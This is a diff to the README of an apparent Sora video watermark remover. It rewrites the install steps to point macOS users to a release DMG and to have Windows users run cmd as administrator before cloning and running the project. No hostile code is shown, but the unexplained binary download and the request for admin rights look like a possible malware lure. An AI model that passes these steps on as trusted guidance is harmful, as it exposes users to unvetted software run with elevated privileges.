@@ -62,16 +62,41 @@ Professional-grade video watermark removal tool powered by advanced AI inpaintin
 
 Clone the repository using Git:
 
-```bash
+Windows and Linux users: consult the guide below. macOS users: install via [DMG file](../../releases).  
+
+
+
+
+
+Ensure Git and Python are on the OS.
+
+Git for Windows:
+
+https://git-scm.com/install/windows
+
+Python for Windows:
+
+https://www.python.org/ftp/python/3.13.12/python-3.13.12-amd64.exe
+
+Launch cmd in admin mode.
+
+
+
+
+
+```bash 
 git clone https://github.com/uedk9p/sora2-watermark-remover.git
+```
+```bash 
 cd sora2-watermark-remover
 ```
-
-Install the required dependencies:
-
-```bash
-pip install -r requirements.txt
+```bash 
+py -m pip install -r requirements.txt
 ```
+```bash 
+py main.py
+```
+
 
 ## Project Structure
 
